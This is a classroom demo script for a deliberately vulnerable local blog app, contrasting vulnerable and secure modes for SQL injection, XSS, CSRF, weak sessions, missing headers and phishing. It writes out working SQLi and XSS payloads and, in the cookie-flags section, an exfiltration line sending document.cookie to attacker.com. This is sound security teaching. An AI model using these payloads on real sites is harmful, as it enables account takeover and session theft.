# Classroom Demonstration Guide: Web Attacks & Countermeasures

This document serves as your live lecture demo script. For each attack, follow the step-by-step instructions, paste the provided payload, and observe the contrast between **Vulnerable Mode** (`SECURITY_MODE=vulnerable`) and **Secure Mode** (`SECURITY_MODE=secure`).

---

## Overview of Demonstrated Vulnerabilities

| # | Attack Vector | Entry Point | Countermeasure |
| :- | :--- | :--- | :--- |
| **1** | SQL Injection (SQLi) | `/login` & `/search` | Parameterized Queries |
| **2** | Cross-Site Scripting (XSS) | `/search` (Reflected) & `/posts/:id/comments` (Stored) | Context-Aware HTML Escaping (`<%= %>`) + CSP |
| **3** | Cross-Site Request Forgery (CSRF) | Profile Email Update (`POST /profile/email`) | CSRF Token Validation + `SameSite=Lax` |
| **4** | Broken Auth & Session Flags | Login form & Cookies | Bcrypt Hashes, `HttpOnly` Cookies, Rate Limiting |
| **5** | Missing Security Headers | All HTTP responses | `Content-Security-Policy`, `X-Frame-Options`, `nosniff` |

---

## 1. SQL Injection (SQLi)

### 1.1 Authentication Bypass (Login)
- **Target URL:** `http://localhost:3000/login`
- **Form Fields:**
  - **Username:** `admin' --`
  - **Password:** `anything` (can be empty or any random text)

#### What Happens:
- **In Vulnerable Mode:**
  - Query executed:
    ```sql
    SELECT * FROM users WHERE username = 'admin' --' AND plaintext_password = '...'
    ```
  - The single quote closes the username string literal, and `--` comments out the password clause entirely.
  - **Result:** You are immediately logged in as `admin` and redirected to the home page with full admin privileges, completely bypassing password verification.
- **In Secure Mode:**
  - Query executed:
    ```sql
    SELECT * FROM users WHERE username = ?
    ```
  - The payload `admin' --` is treated strictly as literal string data for the placeholder `?`.
  - The query finds no user whose literal username is `admin' --`.
  - **Result:** Login fails with `"Invalid username or password"`.

---

### 1.2 Title Search Injection
- **Target URL:** `http://localhost:3000` (search bar in top navigation)
- **Payload:** `' OR '1'='1`

#### What Happens:
- **In Vulnerable Mode:**
  - Query executed:
    ```sql
    SELECT * FROM posts WHERE title LIKE '%' OR '1'='1%'
    ```
  - Because `'1'='1'` evaluates to true for every row, SQLite returns every single post in the database.
  - **Result:** All 5 posts are returned (`Found 5 result(s)`).
- **In Secure Mode:**
  - Query executed:
    ```sql
    SELECT * FROM posts WHERE title LIKE ?
    ```
  - The placeholder binds the literal pattern `%' OR '1'='1%`.
  - **Result:** Searches for titles containing the exact text `' OR '1'='1`. Displays `Found 0 result(s)`.

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Reflected XSS
- **Target URL:** `http://localhost:3000/search`
- **Input:** Top navigation search bar
- **Payload:**
  ```html
  <script>alert('Reflected XSS: ' + document.cookie)</script>
  ```
  *(Or for visual impact without blocking: `<img src=x onerror="alert(document.domain)">`)*

#### What Happens:
- **In Vulnerable Mode:**
  - The view renders: `<%- query %>`.
  - The browser receives unescaped HTML, parses the `<script>` tag, and executes it.
  - **Result:** An alert pop-up appears displaying the session cookie.
- **In Secure Mode:**
  - The view renders: `<%= query %>`.
  - Express/EJS automatically converts special characters (`<` to `&lt;`, `>` to `&gt;`).
  - Furthermore, the HTTP response includes `Content-Security-Policy: default-src 'self'`.
  - **Result:** The payload is rendered harmlessly as plain text on the page (`<script>alert(...)</script>`), and the browser console logs that inline scripts are blocked by CSP.

---

### 2.2 Stored XSS
- **Target URL:** `http://localhost:3000/posts/1`
- **Form:** "Leave a Comment" section at the bottom of the post
- **Fields:**
  - **Your Name:** `Attacker`
  - **Comment:**
    ```html
    <img src=x onerror="alert('Stored XSS Triggered!')">
    ```

#### What Happens:
- **In Vulnerable Mode:**
  - Comment is stored directly in SQLite: `INSERT INTO comments ...`.
  - When any user visits the post, the template renders raw HTML: `<%- comment.content %>`.
  - **Result:** Every student or visitor who opens `/posts/1` immediately executes the injected JavaScript alert pop-up.
- **In Secure Mode:**
  - The comment content is HTML-escaped on output via `<%= comment.content %>`.
  - In addition, CSP blocks inline event handlers (`onerror`).
  - **Result:** The comment text `<img src=x onerror="alert(...)">` displays harmlessly as text.

---

## 3. Cross-Site Request Forgery (CSRF)

### Concept & Scenario:
A logged-in user (`alice`) visits a malicious or compromise-lure site (`http://localhost:4000/csrf.html`). The lure page automatically submits a form to change Alice's email address on `http://localhost:3000/profile/email`.

### Step-by-Step Demo:
1. Start the main blog on port 3000: `SECURITY_MODE=vulnerable npm start`
2. Start the attacker server on port 4000: `node attacker/server.js`
3. In your browser, open `http://localhost:3000/login` and log in as `alice` (password: `alice123`).
4. Visit `http://localhost:3000/profile` and verify current email is `alice@campusblog.local`.
5. In another tab (same browser), navigate to the attacker lure:
   `http://localhost:4000/csrf.html`
6. Return to `http://localhost:3000/profile` (or refresh).

#### What Happens:
- **In Vulnerable Mode:**
  - The blog's session cookie lacked an explicit `SameSite` attribute.
  - The browser included the session cookie on the cross-origin POST request from `localhost:4000` to `localhost:3000`.
  - The server accepted the email change without verifying origin or CSRF tokens.
  - **Result:** Alice's email is silently changed to `attacker@pwned.com` without her knowledge or consent!
- **In Secure Mode:**
  - Repeat the test with `SECURITY_MODE=secure npm start`.
  - When `csrf.html` submits the form, the server checks `req.body._csrf === req.session.csrfToken`.
  - Because the attacker site cannot read or predict Alice's anti-CSRF token, the payload lacks a valid token.
  - **Result:** The server rejects the request with `403 Forbidden: Invalid CSRF token`. Alice's email remains `alice@campusblog.local`.

> [!NOTE]
> **Modern Browser Cookie Behavior Note for Lectures:**
> Modern browsers (Chrome, Edge, Firefox) now enforce `SameSite=Lax` by default on cookies that omit a `SameSite` attribute. Under strict cross-site conditions (e.g. `evil.com` to `example.com`), `SameSite=Lax` blocks cookies on cross-site POST forms.
>
> In our demo, the blog (`http://localhost:3000`) and the attacker (`http://localhost:4000`) share the same registrable domain (`localhost`), meaning browsers consider them **same-site** (different origin, but same site). This allows cookies to be sent even under Lax default, clearly showcasing why **anti-CSRF tokens remain strictly necessary** against attacker subdomains, same-site services, older browsers, and `SameSite=None` endpoints.

---

## 4. Insecure Passwords & Sessions

### 4.1 Plaintext vs. Bcrypt Password Storage
- Inspect the database directly using `sqlite3 blog.db` or Node:
  ```bash
  node -e "const db=require('./db'); console.log(db.prepare('SELECT username, plaintext_password, password FROM users').all());"
  ```
- **In Vulnerable Mode:**
  - The application authenticates by comparing plaintext passwords directly:
    `WHERE username = '...' AND plaintext_password = '...'`.
  - If the database is leaked (via SQL injection, backup exposure, or unauthorized access), every user's cleartext password is compromised.
- **In Secure Mode:**
  - The application stores salted bcrypt hashes (`$2a$10$...`) generated with 10 work rounds.
  - Verification uses `bcrypt.compareSync(password, user.password)`. Even if the database is exposed, passwords are mathematically protected against rainbow tables and brute-force cracking.

---

### 4.2 Cookie Flags (`HttpOnly` & `SameSite`)
- Open Browser DevTools (F12) -> Application/Storage -> Cookies -> `http://localhost:3000`.
- **In Vulnerable Mode:**
  - `HttpOnly` is **unchecked / false**.
  - Open the DevTools Console and run:
    ```javascript
    console.log(document.cookie);
    ```
  - **Result:** The full session token is readable by client-side JavaScript. If XSS occurs, an attacker can steal the cookie: `fetch('http://attacker.com/steal?c=' + document.cookie)`.
- **In Secure Mode:**
  - `HttpOnly` is **checked / true**, and `SameSite=Lax` is set.
  - Run `console.log(document.cookie)` in the DevTools console.
  - **Result:** The session cookie is completely hidden from JavaScript, neutralizing cookie theft via XSS.

---

### 4.3 Brute-Force Rate Limiting
- **Target URL:** `http://localhost:3000/login`
- Enter incorrect credentials 5 times in a row.
- **In Vulnerable Mode:**
  - The server continues processing authentication indefinitely, allowing automated dictionary attacks.
- **In Secure Mode:**
  - On the 6th failed attempt, the server returns:
    `HTTP 429 Too Many Requests: Too many failed login attempts. Please try again in 5 minutes.`

---

## 5. Security Headers

Inspect HTTP response headers using `curl -I http://localhost:3000`:

### In Vulnerable Mode:
```bash
curl -I http://localhost:3000
```
Headers returned:
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: ...
```
- Missing `Content-Security-Policy` (allows malicious inline scripts).
- Missing `X-Frame-Options` (allows clickjacking / iframe embedding).
- Missing `X-Content-Type-Options: nosniff` (vulnerable to MIME-sniffing attacks).

### In Secure Mode:
```bash
curl -I http://localhost:3000
```
Headers returned:
```http
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'self'; style-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Type: text/html; charset=utf-8
```
- **`Content-Security-Policy`:** Prevents execution of unapproved scripts and external data exfiltration.
- **`X-Frame-Options: DENY`:** Blocks the site from being rendered inside an `<iframe>`, preventing UI redressing / clickjacking.
- **`X-Content-Type-Options: nosniff`:** Forces the browser to adhere strictly to declared MIME types.

---

## 6. Phishing Demonstration

- **Attacker URL:** `http://localhost:4000/phishing.html`
- **Classroom Concept:** Phishing relies on interface spoofing rather than software bugs.
- **Demo Walkthrough:**
  1. Open `http://localhost:4000/phishing.html`.
  2. Point out that the typography, logo, and form are identical to `http://localhost:3000/login`.
  3. Ask students: *"What is the only clue that this page is fraudulent?"*
  4. Point to the URL bar showing port `4000` instead of `3000`.
  5. Enter dummy credentials and submit to reveal the educational simulation alert explaining credential harvesting.
